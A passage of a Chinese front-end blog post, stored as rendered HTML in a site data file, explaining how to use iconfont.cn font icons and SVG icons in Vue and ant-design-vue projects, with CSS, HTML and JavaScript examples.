url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.woff2\") format(\"woff2\"),</span></span><br><span class=\"line\"><span class=\"undefined\">      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.woff\") format(\"woff\"), url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.ttf\")</span></span><br><span class=\"line\"><span class=\"undefined\">        format(\"truetype\"),</span></span><br><span class=\"line\"><span class=\"undefined\">      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.svg#iconfont\") format(\"svg\");</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;</span></span><br><span class=\"line\"><span class=\"css\">  <span class=\"selector-class\">.iconfont</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    font-family: \"iconfont\" !important;</span></span><br><span class=\"line\"><span class=\"undefined\">    font-size: 16px;</span></span><br><span class=\"line\"><span class=\"undefined\">    font-style: normal;</span></span><br><span class=\"line\"><span class=\"undefined\">    -webkit-font-smoothing: antialiased;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">-webkit-text-stroke-width</span>: 0<span class=\"selector-class\">.2px</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">    -moz-osx-font-smoothing: grayscale;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"font-class-引用\"><a href=\"#font-class-引用\" class=\"headerlink\" title=\"font-class 引用\"></a>font-class 引用</h2><p>font-class 是 unicode 使用方式的一种变种，主要是解决 unicode 书写不直观，语意不明确的问题。</p>\n<p>与 unicode 使用方式相比，具有如下特点：</p>\n<ul>\n<li>兼容性良好，支持 ie8+，及所有现代浏览器。</li>\n<li>相比于 unicode 语意明确，书写更直观。可以很容易分辨这个 icon 是什么。</li>\n<li>因为使用 class 来定义图标，所以当要替换图标时，只需要修改 class 里面的 unicode 引用。</li>\n<li>不过因为本质上还是使用的字体，所以多色图标还是不支持的。</li>\n</ul>\n<p>使用步骤如下：</p>\n<p>第一步：拷贝项目下面生成的 fontclass 代码：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//at.alicdn.com/t/font_8d5l8fzk5b87iudi.css</span><br></pre></td></tr></table></figure>\n<p>第二步：挑选相应图标并获取类名，应用于页面：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">i</span> <span class=\"attr\">class</span>=<span class=\"string\">\"iconfont icon-xxx\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">i</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>vue 使用示例如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">i</span> <span class=\"attr\">class</span>=<span class=\"string\">\"iconfont iconyunshu\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">i</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">scoped</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">  @<span class=\"keyword\">import</span> url(//at.alicdn.com/t/font_1212356_mw76lv1oaul.css);</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"symbol-引用\"><a href=\"#symbol-引用\" class=\"headerlink\" title=\"symbol 引用\"></a>symbol 引用</h2><p>这是一种全新的使用方式，应该说这才是未来的主流，也是平台目前推荐的用法。相关介绍可以参考这篇文章 这种用法其实是做了一个 svg 的集合，与上面两种相比具有如下特点：</p>\n<ul>\n<li>支持多色图标了，不再受单色限制。</li>\n<li>通过一些技巧，支持像字体那样，通过 font-size,color 来调整样式。</li>\n<li>兼容性较差，支持 ie9+,及现代浏览器。</li>\n<li>浏览器渲染 svg 的性能一般，还不如 png。</li>\n</ul>\n<p>第一步：拷贝项目下面生成的 symbol 代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//at.alicdn.com/t/font_8d5l8fzk5b87iudi.js</span></span><br></pre></td></tr></table></figure>\n<p>第二步：加入通用 css 代码（引入一次就行）：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">  <span class=\"selector-class\">.icon</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    width: 1em;</span></span><br><span class=\"line\"><span class=\"undefined\">    height: 1em;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">vertical-align</span>: <span class=\"selector-tag\">-0</span><span class=\"selector-class\">.15em</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">    fill: currentColor;</span></span><br><span class=\"line\"><span class=\"undefined\">    overflow: hidden;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>第三步：挑选相应图标并获取类名，应用于页面：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">class</span>=<span class=\"string\">\"icon\"</span> <span class=\"attr\">aria-hidden</span>=<span class=\"string\">\"true\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">use</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">\"#icon-xxx\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">use</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>普通页面测试代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, initial-scale=1.0\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://at.alicdn.com/t/font_1212356_01bv0xpc70ab.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">      <span class=\"selector-class\">.icon</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        width: 1em;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 1em;</span></span><br><span class=\"line\"><span class=\"css\">        <span class=\"selector-tag\">vertical-align</span>: <span class=\"selector-tag\">-0</span><span class=\"selector-class\">.15em</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">        fill: currentColor;</span></span><br><span class=\"line\"><span class=\"undefined\">        overflow: hidden;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">class</span>=<span class=\"string\">\"icon\"</span> <span class=\"attr\">aria-hidden</span>=<span class=\"string\">\"true\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">use</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">\"#icontixingshixiang\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">use</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>.vue</code>单文件开发中，因为是模块化开发，是通过 webpack 编译打包的，因此第一步略有不同：保存该 js 文件到本地，在<code>main.js</code>中引入<code>import &quot;./assets/iconfont.js&quot;;</code>。</p>\n<h2 id=\"ant-design-vue-中使用\"><a href=\"#ant-design-vue-中使用\" class=\"headerlink\" title=\"ant-design-vue 中使用\"></a>ant-design-vue 中使用</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"icons-list\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">icon-font</span> <span class=\"attr\">type</span>=<span class=\"string\">\"icon-tuichu\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">icon-font</span> <span class=\"attr\">type</span>=<span class=\"string\">\"icon-facebook\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">icon-font</span> <span class=\"attr\">type</span>=<span class=\"string\">\"icon-twitter\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> &#123; Icon &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue\"</span>;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">const</span> IconFont = Icon.createFromIconfontCN(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    scriptUrl: <span class=\"string\">\"//at.alicdn.com/t/font_8d5l8fzk5b87iudi.js\"</span></span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;);</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    components: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      IconFont</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">scoped</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">  <span class=\"selector-class\">.icons-list</span> &gt;&gt;&gt; <span class=\"selector-class\">.anticon</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    margin-right: 6px;</span></span><br><span class=\"line\"><span class=\"undefined\">    font-size: 24px;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>示例是局部注册，当然对于通用的图标也可以 main.js 中进行全局注册。</p>\n<h2 id=\"直接使用-svg-图标文件\"><a href=\"#直接使用-svg-图标文件\" class=\"headerlink\" title=\"直接使用 svg 图标文件\"></a>直接使用 svg 图标文件</h2><p>第一步：下载 svg 文件，保存到本地；</p>\n<p>第二步：安装 loader:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install vue-svg-loader -D</span><br></pre></td></tr></table></figure>\n<p>第三步：组件中引入 svg 文件，注册组件：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> Logo <span class=\"keyword\">from</span> <span class=\"string\">\"@/assets/logo.svg\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  components: &#123;</span><br><span class=\"line\">    Logo</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>第四步：使用该图标组件：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">Logo</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.iconfont.cn/help/detail?spm=a313x.7781069.1998910419.d8cf4382a&amp;helptype=code\" target=\"_blank\" rel=\"noopener\">IconFont</a></p>\n<p>极客时间——Vue 开发实战</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>日常开发中，除了直接使用 UI 组件库提供有限图标外，怎么使用其他图标呢？目前主要有三种方式，雪碧图、字体图标和 svg 图标。雪碧图方式古老，字体图标方式流行，但是不支持多色图标，svg 方式逐渐流行，支持多色图标。本文主要讲下字体图标和 svg 图标的使用。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a><br><img src=\"/vue-in-action-icon/overview.jpg\" alt=\"测试效果图\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>本次以阿里的图标开源库 <a href=\"https://www.iconfont.cn\" target=\"_blank\" rel=\"noopener\">iconfont.cn</a>为例。</p>\n<h2 id=\"出发\"><a href=\"#出发\" class=\"headerlink\" title=\"出发\"></a>出发</h2><p>平台注册账号，搜索需要图标的关键字，例如“404”，找到自己需要的可以收藏、加入购物车、添加到项目等。把需要的图标添加到自己创建的项目后，就可以在项目面板页管理和使用图标了。<br><img src=\"/vue-in-action-icon/iconfont.jpg\" alt=\"项目面板截图\"></p>\n<h2 id=\"unicode-引用\"><a href=\"#unicode-引用\" class=\"headerlink\" title=\"unicode 引用\"></a>unicode 引用</h2><p>unicode 是字体在网页端最原始的应用方式，特点是：</p>\n<ul>\n<li>兼容性最好，支持 ie6+，及所有现代浏览器。</li>\n<li>支持按字体的方式去动态调整图标大小，颜色等等。</li>\n<li>但是因为是字体，所以不支持多色。只能使用平台里单色的图标，就算项目里有多色图标也会自动去色。</li>\n</ul>\n<p>unicode 使用步骤如下：</p>\n<p>第一步：拷贝项目下面生成的 font-face</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">font-face</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">font-family</span>: <span class=\"string\">\"iconfont\"</span>;</span><br><span class=\"line\">  <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">\"iconfont.eot\"</span>);</span><br><span class=\"line\">  <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">\"iconfont.eot?#iefix\"</span>) <span class=\"built_in\">format</span>(<span class=\"string\">\"embedded-opentype\"</span>), <span class=\"built_in\">url</span>(<span class=\"string\">\"iconfont.woff\"</span>)</span><br><span class=\"line\">      <span class=\"built_in\">format</span>(<span class=\"string\">\"woff\"</span>), <span class=\"built_in\">url</span>(<span class=\"string\">\"iconfont.ttf\"</span>) <span class=\"built_in\">format</span>(<span class=\"string\">\"truetype\"</span>), <span class=\"built_in\">url</span>(<span class=\"string\">\"iconfont.svg#iconfont\"</span>)</span><br><span class=\"line\">      <span class=\"built_in\">format</span>(<span class=\"string\">\"svg\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>第二步：定义使用 iconfont 的样式</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.iconfont</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">font-family</span>: <span class=\"string\">\"iconfont\"</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">  <span class=\"attribute\">font-size</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">font-style</span>: normal;</span><br><span class=\"line\">  <span class=\"attribute\">-webkit-font-smoothing</span>: antialiased;</span><br><span class=\"line\">  <span class=\"attribute\">-webkit-text-stroke-width</span>: <span class=\"number\">0.2px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">-moz-osx-font-smoothing</span>: grayscale;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>第三步：挑选相应图标并获取字体编码，应用于页面</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">i</span> <span class=\"attr\">class</span>=<span class=\"string\">\"iconfont\"</span>&gt;</span>&amp;#x33;<span class=\"tag\">&lt;/<span class=\"name\">i</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>vue 使用示例如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">i</span> <span class=\"attr\">class</span>=<span class=\"string\">\"iconfont\"</span>&gt;</span>&amp;#xe61c;<span class=\"tag\">&lt;/<span class=\"name\">i</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">scoped</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">  @<span class=\"keyword\">font-face</span> &#123;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">font-family</span>: \"<span class=\"selector-tag\">iconfont</span>\"; <span class=\"comment\">/* project id 1212356 */</span></span></span><br><span class=\"line\"><span class=\"undefined\">    src: url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.eot\");</span></span><br><span class=\"line\"><span class=\"undefined\">    src: url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.eot?#iefix\") format(\"embedded-opentype\"),</span></span><br><span class=\"line\"><span class=\"undefined\">      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.woff2\") format(\"woff2\"),</span></span><br><span class=\"line\"><span class=\"undefined\">      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.woff\") format(\"woff\"), url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.ttf\")</span></span><br><span class=\"line\"><span class=\"undefined\">        format(\"truetype\"),</span></span><br><span class=\"line\"><span class=\"undefined\">      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.svg#iconfont\") format(\"svg\");</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;</span></span><br><span class=\"line\"><span class=\"css\">  <span class=\"selector-class\">.iconfont</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    font-family: \"iconfont\" !important;</span></span><br><span class=\"line\"><span class=\"undefined\">    font-size: 16px;</span></span><br><span class=\"line\"><span class=\"undefined\">    font-style: normal;</span></span><br><span class=\"line\"><span class=\"undefined\">    -webkit-font-smoothing: antialiased;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">-webkit-text-stroke-width</span>: 0<span class=\"selector-class\">.2px</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">    -moz-osx-font-smoothing: grayscale;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"font-class-引用\"><a href=\"#font-class-引用\" class=\"headerlink\" title=\"font-class 引用\"></a>font-class 引用</h2><p>font-class 是 unicode 使用方式的一种变种，主要是解决 unicode 书写不直观，语意不明确的问题。</p>\n<p>与 unicode 使用方式相比，具有如下特点：</p>\n<ul>\n<li>兼容性良好，支持 ie8+，及所有现代浏览器。</li>\n<li>相比于 unicode 语意明确，书写更直观。可以很容易分辨这个 icon 是什么。</li>\n<li>因为使用 class 来定义图标，所以当要替换图标时，只需要修改 class 里面的 unicode 引用。</li>\n<li>不过因为本质上还是使用的字体，所以多色图标还是不支持的。</li>\n</ul>\n<p>使用步骤如下：</p>\n<p>第一步：拷贝项目下面生成的 fontclass 代码：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//at.alicdn.com/t/font_8d5l8fzk5b87iudi.css</span><br></pre></td></tr></table></figure>\n<p>第二步：挑选相应图标并获取类名，应用于页面：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">i</span> <span class=\"attr\">class</span>=<span class=\"string\">\"iconfont icon-xxx\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">i</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>vue 使用示例如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">i</span> <span class=\"attr\">class</span>=<span class=\"string\">\"iconfont iconyunshu\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">i</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">scoped</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">  @<span class=\"keyword\">import</span> url(//at.alicdn.com/t/font_1212356_mw76lv1oaul.css);</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"symbol-引用\"><a href=\"#symbol-引用\" class=\"headerlink\" title=\"symbol 引用\"></a>symbol 引用</h2><p>这是一种全新的使用方式，应该说这才是未来的主流，也是平台目前推荐的用法。相关介绍可以参考这篇文章 这种用法其实是做了一个 svg 的集合，与上面两种相比具有如下特点：</p>\n<ul>\n<li>支持多色图标了，不再受单色限制。</li>\n<li>通过一些技巧，支持像字体那样，通过 font-size,color 来调整样式。</li>\n<li>兼容性较差，支持 